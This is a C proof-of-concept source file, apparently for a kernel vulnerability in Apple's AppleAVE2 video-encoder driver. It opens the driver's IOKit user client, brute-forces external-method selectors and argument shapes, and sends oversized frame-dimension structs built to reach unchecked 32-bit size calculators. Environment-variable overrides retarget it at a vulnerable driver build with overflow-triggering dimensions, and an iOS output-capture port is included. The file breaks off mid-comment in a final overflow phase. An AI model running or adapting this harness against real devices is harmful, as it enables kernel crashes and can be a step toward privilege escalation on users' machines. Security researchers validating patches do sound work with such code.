// CVE-2026-64747 — AppleAVE2 userspace reachability PoC (macOS, IOKit direct)
//
// Goal: validate reachability of AppleAVE2UserClient from userspace on this host,
//       probe external-method selectors, and fire a session-dimensions struct whose
//       width*height exceeds the 26.6 clamp (0x1ffe0000 = 65520*8192) at the
//       AVE_Client_Enc_Check gate.
//
// Honest classification of outcome:
//   reached-userclient : IOServiceOpen succeeded, external methods answered
//   wrong-struct       : UC opened but every selector returns kIOReturnBadArgument
//                        (0xe00002c2) / kIOReturnUnsupported — dispatch reached but
//                        our struct layout doesn't match any handler's expectation
//   clamp-rejected     : the 26.6 "frame dimension out of range" gate (-1001/
//                        0xfffffc17 family) — proves we reached AVE_Client_Enc_Check
//                        on a PATCHED driver (905.40.1 = fixed). On vulnerable
//                        905.36.1 the same input would reach the unchecked
//                        32-bit DPB/recon size calculators (FUN_fffffff0084e52c8).
//   panic              : crash-tier only, do NOT claim RCE.
//
// This host: Mac Studio (J375c), macOS 26.6.2, AppleAVE2 905.40.1 (FIXED).
// Expected: reached-userclient + clamp/wrong-struct, NOT overflow.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "ave2_wire.h"

#define CLAMP_PRODUCT 0x1ffe0000ULL   /* 65520*8192 — the 26.6 width*height clamp */

static const char *kr_name(kern_return_t kr) {
    switch (kr) {
        case KERN_SUCCESS:               return "KERN_SUCCESS";
        case kIOReturnError:             return "kIOReturnError";
        case kIOReturnNoMemory:          return "kIOReturnNoMemory";
        case kIOReturnNoResources:       return "kIOReturnNoResources";
        case kIOReturnIPCError:          return "kIOReturnIPCError";
        case kIOReturnNoDevice:          return "kIOReturnNoDevice";
        case kIOReturnNotPrivileged:     return "kIOReturnNotPrivileged";
        case kIOReturnBadArgument:       return "kIOReturnBadArgument";
        case kIOReturnLockedRead:        return "kIOReturnLockedRead";
        case kIOReturnLockedWrite:       return "kIOReturnLockedWrite";
        case kIOReturnExclusiveAccess:   return "kIOReturnExclusiveAccess";
        case kIOReturnBadMessageID:      return "kIOReturnBadMessageID";
        case kIOReturnUnsupported:       return "kIOReturnUnsupported";
        case kIOReturnVMError:           return "kIOReturnVMError";
        case kIOReturnInternalError:     return "kIOReturnInternalError";
        case kIOReturnIOError:           return "kIOReturnIOError";
        case kIOReturnCannotLock:        return "kIOReturnCannotLock";
        case kIOReturnNotOpen:           return "kIOReturnNotOpen";
        case kIOReturnNotReadable:       return "kIOReturnNotReadable";
        case kIOReturnNotWritable:       return "kIOReturnNotWritable";
        case kIOReturnNotAligned:        return "kIOReturnNotAligned";
        case kIOReturnBadMedia:          return "kIOReturnBadMedia";
        case kIOReturnStillOpen:         return "kIOReturnStillOpen";
        case kIOReturnRLDError:          return "kIOReturnRLDError";
        case kIOReturnDMAError:          return "kIOReturnDMAError";
        case kIOReturnBusy:              return "kIOReturnBusy";
        case kIOReturnTimeout:           return "kIOReturnTimeout";
        case kIOReturnOffline:           return "kIOReturnOffline";
        case kIOReturnNotReady:          return "kIOReturnNotReady";
        case kIOReturnNotAttached:       return "kIOReturnNotAttached";
        case kIOReturnNoChannels:        return "kIOReturnNoChannels";
        case kIOReturnNoSpace:           return "kIOReturnNoSpace";
        case kIOReturnPortExists:        return "kIOReturnPortExists";
        case kIOReturnCannotWire:        return "kIOReturnCannotWire";
        case kIOReturnNoInterrupt:       return "kIOReturnNoInterrupt";
        case kIOReturnNoFrames:          return "kIOReturnNoFrames";
        case kIOReturnMessageTooLarge:   return "kIOReturnMessageTooLarge";
        case kIOReturnNotPermitted:      return "kIOReturnNotPermitted";
        case kIOReturnNoPower:           return "kIOReturnNoPower";
        case kIOReturnNoMedia:           return "kIOReturnNoMedia";
        case kIOReturnUnformattedMedia:  return "kIOReturnUnformattedMedia";
        case kIOReturnUnsupportedMode:   return "kIOReturnUnsupportedMode";
        case kIOReturnUnderrun:          return "kIOReturnUnderrun";
        case kIOReturnOverrun:           return "kIOReturnOverrun";
        case kIOReturnDeviceError:       return "kIOReturnDeviceError";
        case kIOReturnNoCompletion:      return "kIOReturnNoCompletion";
        case kIOReturnAborted:           return "kIOReturnAborted";
        case kIOReturnNoBandwidth:       return "kIOReturnNoBandwidth";
        case kIOReturnNotResponding:     return "kIOReturnNotResponding";
        case kIOReturnIsoTooOld:         return "kIOReturnIsoTooOld";
        case kIOReturnIsoTooNew:         return "kIOReturnIsoTooNew";
        case kIOReturnNotFound:          return "kIOReturnNotFound";
        case kIOReturnInvalid:           return "kIOReturnInvalid";
        default:                         return "kIOReturn?";
    }
}

/* Session-dimensions probe struct — layout is a best-effort reconstruction:
 * the fixed kext's AVE_Client_Enc_Check memcpy's attacker structs of
 * 0x300/0x2460/0x4e0/0x2fcc/0x6b4 bytes into the session object, and the
 * width/height live at session+0x1838/0x183c. For a first probe we send a
 * small scalar header; the classification of return codes tells us whether
 * the dispatch table accepted it. */
typedef struct {
    uint32_t codec;       /* e.g. 'avc1' H.264 = 0, hevc = 1 (probe values)  */
    uint32_t client_type; /* encoder client type                             */
    uint32_t width;       /* frame width                                     */
    uint32_t height;      /* frame height                                    */
    uint32_t priority;
    uint32_t slices;
    uint32_t enc_type;
    uint32_t flags;
    uint8_t  payload[0x100]; /* tail filler — matches small-info memcpy size */
} ave_probe_struct_t;


/* iOS port: mirror stdout/stderr into $HOME/Documents/poc_out.txt so the run transcript
   can be pulled off the device (iOS does not surface app stdout in the syslog). */
static void iOS_capture_output(void)
{
	const char *home = getenv("HOME");
	if (!home) return;
	char dir[1024], path[1200];
	snprintf(dir, sizeof(dir), "%s/Documents", home);
	mkdir(dir, 0755);
	snprintf(path, sizeof(path), "%s/poc_out.txt", dir);
	FILE *f = fopen(path, "w");
	if (!f) return;
	dup2(fileno(f), STDOUT_FILENO);
	dup2(fileno(f), STDERR_FILENO);
	setvbuf(stdout, NULL, _IOLBF, 0);
}

int main(int argc, char **argv) {
	iOS_capture_output();
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== CVE-2026-64747 AppleAVE2 reachability PoC (macOS 26.6.2 / kext 905.40.1 FIXED) ===\n");

    /* ---- Step 1: locate the AppleAVE2Driver service ---- */
    CFMutableDictionaryRef matching = IOServiceMatching("AppleAVE2Driver");
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, matching);
    if (!service) {
        printf("[-] AppleAVE2Driver service NOT FOUND — track: needs physical iPhone research kernelcache\n");
        return 1;
    }
    printf("[+] AppleAVE2Driver service found: 0x%x\n", service);

    /* registry id for cross-check with ioreg (expect 0x100000517) */
    uint64_t regid = 0;
    IORegistryEntryGetRegistryEntryID(service, &regid);
    printf("[+] registryEntryID: 0x%llx\n", regid);

    /* ---- Step 2: open a user client ----
     * type field = AVE clientType (uc+0xf0, set by newUserClient from the open
     * type — dispatch/fffffff00864a3f4.c:77 "*(uint *)(param_1 + 0x1e) =
     * (uint)param_6"). type=0 = AVE_ClientType_None → session create is
     * rejected downstream (kernel log: AVE_Client_Create:2108). type=1 =
     * encoder client — VERIFIED LIVE: create returns KERN_SUCCESS with a
     * session cookie (probe8). Try 1 first, then 0..5. */
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = KERN_FAILURE;
    uint32_t opened_type = 0;
    for (uint32_t type = 1; type < 8 && !conn; type++) {
        kr = IOServiceOpen(service, mach_task_self(), type, &conn);
        printf("[*] IOServiceOpen(type=%u) -> 0x%x (%s)\n", type, kr, kr_name(kr));
        if (kr == KERN_SUCCESS) { opened_type = type; break; }
        conn = MACH_PORT_NULL;
    }
    if (!conn) { /* fall back to type 0 */
        kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
        printf("[*] IOServiceOpen(type=0) -> 0x%x (%s)\n", kr, kr_name(kr));
        if (kr == KERN_SUCCESS) opened_type = 0;
    }
    if (!conn) {
        printf("[-] Could not open any userclient type (all types 0-3 rejected)\n");
        printf("    CLASSIFICATION: service-present / userclient-open-failed\n");
        IOObjectRelease(service);
        return 2;
    }
    printf("[+] AppleAVE2UserClient OPENED (type=%u, connect=0x%x) — reached-userclient\n",
           opened_type, conn);

    /* FAST-PATH: when PHASE_G_ONLY=1, skip all probing phases and go directly to
     * the derived session flow (fresh connection, no state pollution). */
    int live_selectors[64]; int n_live = 0;
    int clamp_hits = 0, badarg_hits = 0, other_hits = 0;
    if (getenv("PHASE_G_ONLY")) goto phase_g;

    /* ---- Step 3: probe external method selectors ----
     * Sweep 0..31 with zero scalars first (safest — handlers that expect
     * structs will reject size mismatch, handlers that don't exist return
     * kIOReturnUnsupported/BadArgument). */
    printf("\n[*] Phase A: selector sweep (scalar-only, 0 scalars)\n");
    for (uint32_t sel = 0; sel < 32; sel++) {
        uint64_t out_scalars[8] = {0};
        uint32_t out_cnt = 0;
        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, out_scalars, &out_cnt);
        printf("    sel=%2u scalar0 -> 0x%08x (%s)\n", sel, kr, kr_name(kr));
        if (kr != kIOReturnUnsupported && kr != kIOReturnBadArgument &&
            kr != (kern_return_t)0xe00002c2 /* bad selector */) {
            live_selectors[n_live++] = sel;
        }
    }

    printf("\n[*] Phase B: struct-input sweep on selectors 0..15 (256-byte zero struct)\n");
    uint8_t zbuf[256]; memset(zbuf, 0, sizeof(zbuf));
    for (uint32_t sel = 0; sel < 16; sel++) {
        uint8_t outbuf[256]; size_t outsz = sizeof(outbuf);
        kr = IOConnectCallStructMethod(conn, sel, zbuf, sizeof(zbuf), outbuf, &outsz);
        printf("    sel=%2u struct256 -> 0x%08x (%s) outsz=%zu\n", sel, kr, kr_name(kr), outsz);
    }

    /* ---- Step 4: oversized-dimensions probe (the CVE trigger shape) ----
     * width*height must exceed 0x1ffe0000. 65520 * 8193 = 0x1FFE1FF0 > clamp.
     * On 905.40.1 (this host) the new clamp in AVE_Client_Enc_Check rejects it
     * ("frame dimension out of range"). On vulnerable 905.36.1 the same dims
     * flow into unchecked 32-bit calculators. */
    uint32_t w = 65520, h = 8193;
    printf("\n[*] Phase C: oversized dims %ux%u (product=0x%llx > clamp 0x%llx)\n",
           w, h, (unsigned long long)w * h, CLAMP_PRODUCT);

    ave_probe_struct_t p; memset(&p, 0, sizeof(p));
    p.codec = 0; p.client_type = 0; p.width = w; p.height = h;
    p.priority = 0; p.slices = 1; p.enc_type = 0; p.flags = 0;

    for (uint32_t sel = 0; sel < 16; sel++) {
        uint8_t outbuf[256]; size_t outsz = sizeof(outbuf);
        kr = IOConnectCallStructMethod(conn, sel, &p, sizeof(p), outbuf, &outsz);
        printf("    sel=%2u bigdims -> 0x%08x (%s)\n", sel, kr, kr_name(kr));
        /* 0xfffffc17 = -1001 (kVTInvalidSession-ish family the report quotes
         * for the dimension gate); also watch for 0xfffffbf3 etc. */
        if ((uint32_t)kr == 0xfffffc17 || (uint32_t)kr == 0xfffffbb9) clamp_hits++;
        else if (kr == kIOReturnBadArgument || kr == kIOReturnUnsupported) badarg_hits++;
        else other_hits++;
    }

    /* ---- Step 4b: RE-derived struct-size sweep on the live selector band 1-10 ----
     * decomp shows AVE_Client_Enc_Check memcpy's attacker blobs of
     * 0x300 / 0x2460 / 0x4e0 / 0x2fcc / 0x6b4 bytes. Try those exact sizes
     * on selectors 1..10 to find which selector accepts which size. */
    printf("\n[*] Phase B2: exact-size sweep (0x300/0x4e0/0x6b4/0x2460) on selectors 1..10\n");
    const size_t sizes[] = { 0x300, 0x4e0, 0x6b4, 0x2460 };
    static uint8_t bigbuf[0x2460]; memset(bigbuf, 0, sizeof(bigbuf));
    /* plant plausible dims near the head for any header peek */
    *(uint32_t *)(bigbuf + 0x0) = 65520;   /* w */
    *(uint32_t *)(bigbuf + 0x4) = 8193;    /* h */
    for (int si = 0; si < 4; si++) {
        for (uint32_t sel = 1; sel <= 10; sel++) {
            uint8_t ob[128]; size_t osz = sizeof(ob);
            kr = IOConnectCallStructMethod(conn, sel, bigbuf, sizes[si], ob, &osz);
            if (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported)
                printf("    HIT sel=%u size=0x%zx -> 0x%08x (%s) osz=%zu\n",
                       sel, sizes[si], kr, kr_name(kr), osz);
        }
    }
    printf("    (silent = all BadArgument/Unsupported; any HIT line above is a live handler)\n");

    /* ---- Step 4c: RE-derived shared-mem command (FUN_fffffff008644a38 path) ----
     * The wire-format decomp chain (see ave2_wire.h / WIRE_FORMAT.md) shows one
     * selector drives FUN_644a38, which requires:
     *   structureInputSize  >= 0x1a0a0        (644a38.c:83)
     *   structureOutputSize >= 0x20           (644a38.c:84)
     * and inside the buffer:
     *   +0x10/+0x18/+0x20 as non-negative s64 (640348 common-params gate)
     *   command struct at +0x338 with width @ +0xd90 / height @ +0xd94 absolute
     *   (51e194 clamp: w*h > 0x1ffe0000 -> 0xfffffc17).
     * Sweep selectors 1..10 twice: sane dims then oversized dims. A selector
     * that rejects A with BadArgument isn't the 644a38 entry; one that accepts
     * the shape but answers 0xfffffc0d = session missing; one that answers
     * 0xfffffc17 ONLY for oversized dims = clamp reached (WIN on patched kext).
     */
    printf("\n[*] Phase D: shaped 0x1a0a0-byte cmd sweep on selectors 1..10\n");
    static uint8_t cmdbuf[AVE2_INBUF_MIN];
    static uint8_t outbuf[0x40];
    for (int variant = 0; variant < 2; variant++) {
        uint32_t vw = variant ? 65520 : 1920;
        uint32_t vh = variant ? 8193  : 1080;
        printf("  -- variant %s (%ux%u, product=0x%llx %s clamp) --\n",
               variant ? "OVERSIZED" : "sane", vw, vh,
               (unsigned long long)vw * vh,
               ((unsigned long long)vw * vh > AVE2_CLAMP_PRODUCT) ? ">" : "<=");
        memset(cmdbuf, 0, sizeof(cmdbuf));
        /* common-params gate: s64 @ +0x10/+0x18/+0x20 must be >= 0 (zeros are fine) */
        *(int64_t *)(cmdbuf + 0x10) = 0;
        *(int64_t *)(cmdbuf + 0x18) = 0;
        *(int64_t *)(cmdbuf + 0x20) = 0;
        /* command struct fields (absolute offsets incl. +0x338 base) */
        *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY) = 0;    /* (pri+100)<0x12d ok */
        *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)    = (int32_t)vw;
        *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)   = (int32_t)vh;
        *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES)  = 1;    /* (slices-1)<0x20 */
        *(int32_t *)(cmdbuf + AVE2_OFF_ENCTYPE)  = 0;
        for (uint32_t sel = 1; sel <= 10; sel++) {
            size_t osz = sizeof(outbuf);
            memset(outbuf, 0, sizeof(outbuf));
            kr = IOConnectCallStructMethod(conn, sel, cmdbuf, sizeof(cmdbuf),
                                           outbuf, &osz);
            printf("    sel=%2u shaped -> 0x%08x (%s)",
                   sel, kr, kr_name(kr));
            /* 0xfffffc17 & family are the wrapper/validation codes the CVE
             * report quotes for the fixed gate; print raw to allow family pick-up */
            if (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported) {
                printf("  *** NON-BADARG ***");
                if ((uint32_t)kr == AVE2_RET_WRONG_STATE)
                    printf(" [wrong-state: session not attached]");
                if ((uint32_t)kr == AVE2_RET_BADARG_WRAPPERS)
                    printf(" [0xfffffc17: gate/clamp family]");
                if (kr == KERN_SUCCESS && osz >= 0x1c) {
                    printf(" [OUT echo0=%016llx echo1=%016llx status=%08x]",
                           *(unsigned long long *)(outbuf + 0x0),
                           *(unsigned long long *)(outbuf + 0x8),
                           *(unsigned *)(outbuf + 0x18));
                }
            }
            printf("\n");
        }
    }

    /* ---- Step 4d: argument-shape brute force ----
     * All 10 live selectors return BadArgument for an exactly-0x1a0a0 struct,
     * so the IOKit shape gate (checkScalarInputCount/checkStructureInputSize)
     * rejects before any handler runs. Brute-force: scalarIn 0..8 with and
     * without the 0x1a0a0 struct, print anything that ISN'T BadArgument/
     * Unsupported — that combination passed the shape gate and reached a
     * handler, revealing the entry's declared arg shape. */
    /* ---- Exact-shape attempt ----
     * Vtable decode shows the external-method table (metaclass __const region
     * fffffff007dc180x): entries = {func, checkStructureInputSize<<32,
     * checkStructureOutputSize<<32}, with sel4 = {FUN_644a38, 0x1a0a0, 0x20}.
     * Earlier probes combined the right struct with WRONG output shapes
     * (0x40 outbuf / 8 scalar outs). Retry with exact per-selector shapes. */
    printf("\n[*] Phase D2: EXACT-shape retries per vtable decode\n");
    struct { uint32_t sel; size_t insz; size_t outsz; const char *tag; } exact[] = {
        { 1, 0x920,   0x28,  "sel1 (f 63ee7c)" },
        { 2, 0x28,    0x20,  "sel2 (f 643978 = 6-verb handler prologue)" },
        { 3, 0x38,    0x20,  "sel3 (f 64017c)" },
        { 4, 0x1a0a0, 0x20,  "sel4 = FUN_644a38 configure/shared-mem cmd" },
        { 5, 0x1a0b0, 0x150, "sel5 (f 64150c)" },
        { 6, 0x30,    0x20,  "sel6 (f 642024)" },
        { 7, 0x30,    0x20,  "sel7 (f 64283c)" },
        { 8, 0x30,    0x20,  "sel8 (f 643054)" },
        { 9, 0x30,    0x20,  "sel9 (f 64386c)" },
        {10, 0x30,    0x20,  "sel10 (f 644084)" },
    };
    for (int vi = 0; vi < 2; vi++) {
        uint32_t vw = vi ? 65520 : 1920, vh = vi ? 8193 : 1080;
        printf("  -- %s dims %ux%u --\n", vi ? "OVERSIZED" : "sane", vw, vh);
        for (size_t ei = 0; ei < sizeof(exact)/sizeof(exact[0]); ei++) {
            memset(cmdbuf, 0, sizeof(cmdbuf));
            *(int64_t *)(cmdbuf + 0x10) = 0;
            *(int64_t *)(cmdbuf + 0x18) = 0;
            *(int64_t *)(cmdbuf + 0x20) = 0;
            *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY) = 0;
            *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)    = (int32_t)vw;
            *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)   = (int32_t)vh;
            *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES) = 1;
            uint8_t o32[0x150]; size_t osz = exact[ei].outsz; memset(o32, 0, sizeof(o32));
            kr = IOConnectCallStructMethod(conn, exact[ei].sel,
                                           cmdbuf, exact[ei].insz, o32, &osz);
            printf("    %s in=0x%zx out=0x%zx -> 0x%08x (%s)%s\n",
                   exact[ei].tag, exact[ei].insz, exact[ei].outsz,
                   kr, kr_name(kr),
                   (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported)
                       ? "  *** PASSED SHAPE GATE ***" : "");
        }
    }
    printf("\n[*] Phase E: arg-shape brute force (scalarIn 0..8 x {noStruct,0x1a0a0}) on sels 1..10\n");
    int shape_hits = 0;
    for (uint32_t sel = 1; sel <= 10; sel++) {
        for (uint32_t nsc = 0; nsc <= 8; nsc++) {
            uint64_t in_scalars[8];
            uint64_t out_scalars[8];
            uint32_t outn = 8;
            for (int q = 0; q < 8; q++) in_scalars[q] = 0;
            /* variant 1: scalars + 0x1a0a0 struct */
            memset(cmdbuf, 0, sizeof(cmdbuf));
            *(int64_t *)(cmdbuf + 0x10) = 0;
            *(int64_t *)(cmdbuf + 0x18) = 0;
            *(int64_t *)(cmdbuf + 0x20) = 0;
            *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY) = 0;
            *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)    = 65520;
            *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)   = 8193;
            *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES) = 1;
            size_t osz = sizeof(outbuf); memset(outbuf, 0, sizeof(outbuf));
            kr = IOConnectCallMethod(conn, sel, in_scalars, nsc,
                                     cmdbuf, sizeof(cmdbuf),
                                     out_scalars, &outn, outbuf, &osz);
            if (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported) {
                printf("    HIT sel=%u nsc=%u +struct1a0a0 -> 0x%08x  outn=%u [0]=%llx\n",
                       sel, nsc, kr, outn, out_scalars[0]);
                shape_hits++;
            }
            /* variant 2: scalars only, no struct */
            outn = 8; osz = sizeof(outbuf); memset(outbuf, 0, sizeof(outbuf));
            for (uint32_t q = 0; q < 8; q++) out_scalars[q] = 0;
            kr = IOConnectCallMethod(conn, sel, in_scalars, nsc,
                                     NULL, 0,
                                     out_scalars, &outn, outbuf, &osz);
            if (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported) {
                printf("    HIT sel=%u nsc=%u noStruct -> 0x%08x  outn=%u [0]=%llx\n",
                       sel, nsc, kr, outn, out_scalars[0]);
                shape_hits++;
            }
        }
    }
    printf("    shape hits: %d (0 = every entry rejects our shapes)\n", shape_hits);

    /* ---- Step 4e: wide struct-size x scalar-count matrix ----
     * Still BadArgument everywhere above, so widen: IOKit's per-entry
     * checkStructureInputSize must equal one of the table-declared sizes.
     * Probe a broad set of candidate struct sizes with scalar counts 0..8.
     * Any non-BadArgument result reveals that entry's declared shape. */
    printf("\n[*] Phase E2: wide matrix structSize x scalarIn on sels 1..10\n");
    const size_t probe_sizes[] = {
        0, 4, 8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50,
        0x68, 0x80, 0x100, 0x158, 0x200, 0x300, 0x338, 0x690, 0x1000,
        0x2000, 0x10000, 0x1a0a0
    };
    int matrix_hits = 0;
    static uint8_t zbig[0x20000];
    for (uint32_t sel = 1; sel <= 10; sel++) {
        for (size_t si = 0; si < sizeof(probe_sizes)/sizeof(probe_sizes[0]); si++) {
            size_t sz = probe_sizes[si];
            for (uint32_t nsc = 0; nsc <= 8; nsc++) {
                uint64_t in_scalars[8] = {0}, out_scalars[8] = {0};
                uint32_t outn = 8;
                size_t osz = sizeof(outbuf); memset(outbuf, 0, sizeof(outbuf));
                const void *ip = sz ? (const void *)zbig : NULL;
                kr = IOConnectCallMethod(conn, sel, in_scalars, nsc,
                                         ip, sz, out_scalars, &outn,
                                         outbuf, &osz);
                if (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported) {
                    printf("    MATRIX-HIT sel=%u structSize=0x%zx scalarIn=%u -> 0x%08x outn=%u\n",
                           sel, sz, nsc, kr, outn);
                    matrix_hits++;
                }
            }
        }
    }
    printf("    matrix hits: %d\n", matrix_hits);

    /* ---- Step 4f: async-trap probe ----
     * If the 10 selectors live in the ASYNC dispatch list
     * (getAsyncTargetAndMethodForIndex), the sync trap returns BadArgument
     * for every shape while the async trap accepts. Probe with a wake port. */
    printf("\n[*] Phase F: async selector probe (wake port + scalar input)\n");
    mach_port_t wake = MACH_PORT_NULL;
    kern_return_t mkr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
    if (mkr != KERN_SUCCESS) {
        printf("    mach_port_allocate failed: 0x%x — skipping async probe\n", mkr);
    } else {
        char async_buf[0x100];
        uint32_t async_hits = 0;
        for (uint32_t sel = 1; sel <= 10; sel++) {
            uint64_t in_scalars[8] = {0};
            for (uint32_t nsc = 0; nsc <= 4; nsc++) {
                io_async_ref64_t aref; memset(aref, 0, sizeof(aref));
                kr = IOConnectCallAsyncScalarMethod(conn, sel, wake, aref, 0,
                                                    in_scalars, nsc,
                                                    NULL, NULL);
                printf("    async sel=%u nsc=%u -> 0x%08x (%s)\n", sel, nsc, kr, kr_name(kr));
                if (kr != kIOReturnBadArgument && kr != kIOReturnUnsupported) async_hits++;
            }
        }
        printf("    async non-badarg hits: %u\n", async_hits);
        mach_port_destroy(mach_task_self(), wake);
        (void)async_buf;
    }

    /* ---- Step 5: the real session flow (RE-derived wire format) ----
     * (1) sel1 session-CREATE: 0x920-byte struct, "905.40.1" at +0x28,
     *     encType 1..3 at +0x918. Output: cookie = uc+0xf8 at out+0x00,
     *     status at out+0x18.
     * (2) sel4 CONFIGURE: 0x1a0a0 shared-mem cmd with oversized dims at
     *     abs +0xd90/+0xd94 -> clamp in AVE_Client_Enc_Check (51e194).
     */
    printf("\n[*] Phase G: session-create (sel1) then configure (sel4) with oversized dims\n");
phase_g: ;
    uint64_t session_cookie = 0, cookie_id = 0;
    uint32_t create_status = 0xffffffff;
    static uint8_t cbuf[AVE2_CREATE_IN_SIZE];
    uint8_t cout[AVE2_CREATE_OUT_SIZE];
    int created = 0;
    /* Best-known create shape (see ave2_wire.h): version string, encType>=1,
     * log level>=1 & count>0, monotonic log index. The remaining inner
     * AVE_Client_Create params (in+0x38..+0x808) are UNKNOWN — documented. */
    for (int variant = 0; variant < 2 && !created; variant++) {
    for (uint32_t enc = 1; enc <= 3 && !created; enc++) {
        memset(cbuf, 0, sizeof(cbuf));
        memset(cout, 0, sizeof(cout));
        /* version gate: default FIXED 905.40.1 (this host); AVE2_VERSION env overrides
         * for a vulnerable-kernel target (905.36.1). */
        const char *ver = getenv("AVE2_VERSION"); if (!ver) ver = "905.40.1";
        memcpy(cbuf + AVE2_CREATE_OFF_VERSION, ver, strlen(ver) < 8 ? strlen(ver) : 8);
        *(int32_t *)(cbuf + AVE2_CREATE_OFF_ENCTYPE) = (int32_t)enc; /* encType >= 1 */
        *(int32_t *)(cbuf + 0x910) = 1;                              /* log level >=1 */
        *(int32_t *)(cbuf + 0x914) = 1;                              /* log count >0  */
        *(uint64_t *)(cbuf + 0x808) = 0x100000 + variant * 0x100 + enc; /* monotonic */
        if (variant == 1) *(int32_t *)(cbuf + 0x38) = 1;             /* params encType? */
        size_t cosz = AVE2_CREATE_OUT_SIZE;
        kern_return_t ckr = IOConnectCallStructMethod(conn, AVE2_SEL_CREATE,
                                                      cbuf, sizeof(cbuf),
                                                      cout, &cosz);
        create_status = *(uint32_t *)(cout + 0x18);
        printf("    create v%d encType=%u -> trap=0x%08x (%s) statusWord=0x%08x\n",
               variant, enc, ckr, kr_name(ckr), create_status);
        if (cosz >= 0x28) {
            session_cookie = *(uint64_t *)(cout + 0x00);
            cookie_id      = *(uint64_t *)(cout + 0x20);
            printf("        out: cookie(uc+0xf8)=0x%016llx  echo1=0x%016llx echo2=0x%016llx  id(uc+0xe8)=0x%016llx\n",
                   (unsigned long long)session_cookie,
                   (unsigned long long)*(uint64_t *)(cout + 0x8),
                   (unsigned long long)*(uint64_t *)(cout + 0x10),
                   (unsigned long long)cookie_id);
        }
        if (ckr == KERN_SUCCESS && create_status == 0) {
            printf("    [+] SESSION CREATED (status=0, cookie=0x%016llx)\n",
                   (unsigned long long)session_cookie);
            created = 1;
        }
    } /* enc */
    } /* variant */
    if (!created)
        printf("    [-] session create did not return status 0 (see statusWord lines)\n");

    /* configure: same buffer as Phase D; only differentiator = session exists now */
    memset(cmdbuf, 0, sizeof(cmdbuf));
    *(int64_t *)(cmdbuf + 0x10) = 0;
    *(int64_t *)(cmdbuf + 0x18) = 0;
    *(int64_t *)(cmdbuf + 0x20) = 0;
    *(int32_t *)(cmdbuf + AVE2_OFF_PRIORITY) = 0;
    /* dims: default = FIXED-host clamp trip (65520x8193, exceeds 0x1ffe0000 product).
     * AVE2_W / AVE2_H env override for the LRB-overflow dims (65424x8080) that target
     * the VULNERABLE 905.36.1 build (area 0x1f238100 < product cap, so it passes the
     * dimension gate and reaches the LRB calculator that wraps to 0x80000000). */
    uint32_t dw = 65520, dh = 8193;
    const char *ew = getenv("AVE2_W"); if (ew) dw = (uint32_t)strtoul(ew, 0, 10);
    const char *eh = getenv("AVE2_H"); if (eh) dh = (uint32_t)strtoul(eh, 0, 10);
    *(int32_t *)(cmdbuf + AVE2_OFF_WIDTH)    = (int32_t)dw;
    *(int32_t *)(cmdbuf + AVE2_OFF_HEIGHT)   = (int32_t)dh;
    *(uint32_t *)(cmdbuf + AVE2_OFF_SLICES) = 1;
    *(int32_t *)(cmdbuf + AVE2_OFF_ENCTYPE) = 1;
    uint8_t fout[0x20]; size_t fosz = sizeof(fout); memset(fout, 0, sizeof(fout));
    kern_return_t fkr = IOConnectCallStructMethod(conn, AVE2_SEL_CONFIGURE,
                                                  cmdbuf, sizeof(cmdbuf), fout, &fosz);
    uint32_t conf_status = fosz >= 0x1c ? *(uint32_t *)(fout + 0x18) : 0xdeadbeef;
    printf("    configure(sel4, %ux%u) -> trap=0x%08x (%s) statusWord=0x%08x\n",
           dw, dh, fkr, kr_name(fkr), conf_status);
    if (fosz >= 0x1c)
        printf("        out: echo0=0x%016llx echo1=0x%016llx echo2=0x%016llx\n",
               (unsigned long long)*(uint64_t *)(fout + 0x0),
               (unsigned long long)*(uint64_t *)(fout + 0x8),
               (unsigned long long)*(uint64_t *)(fout + 0x10));
    if ((uint32_t)fkr == AVE2_RET_WRONG_STATE || conf_status == AVE2_RET_WRONG_STATE)
        printf("    => cookie-rejected / wrong state (session not attached to selector path)\n");
    if ((uint32_t)fkr == AVE2_RET_BADARG_WRAPPERS || conf_status == AVE2_RET_BADARG_WRAPPERS)
        printf("    => 0xfffffc17 = CLAMP/GATE family — reached fixed validation (WIN)\n");

    /* ---- Phase H: mode-5 (HEVC 10-bit multipass) LRB-overflow configure ----
     * Fields from decomp_more/fffffff0084ccdac.c + 51e9b4.c:32 memcpy map
     * (see ave2_wire.h MODE-5 block): p6=2 @inbuf+0x2fbc, p8=10 @inbuf+0x2fc0,
     * p9-flag byte bit0=0 @inbuf+0x2fcc. Dims 64656x8080 (area 0x1f238100 <
     * product cap -> passes 51e194 clamp, reaches LRB p2==5 calculator).
     * Configure is issued via IOConnectCallAsyncStructMethod because the fixed
     * kext's IO_Config gate (kernel log line 337) requires a non-null
     * asyncWakePort + asyncReferenceCount > 0 — the sync path (run3) was
     * rejected at 0xe00002bc BEFORE the struct was ever validated.
     * FIXED host expectation: "LRB size overflow" assert (4eedf8.c:147) ->
     * configure returns 0 -> proof we reached the exact patched calculator.
     */
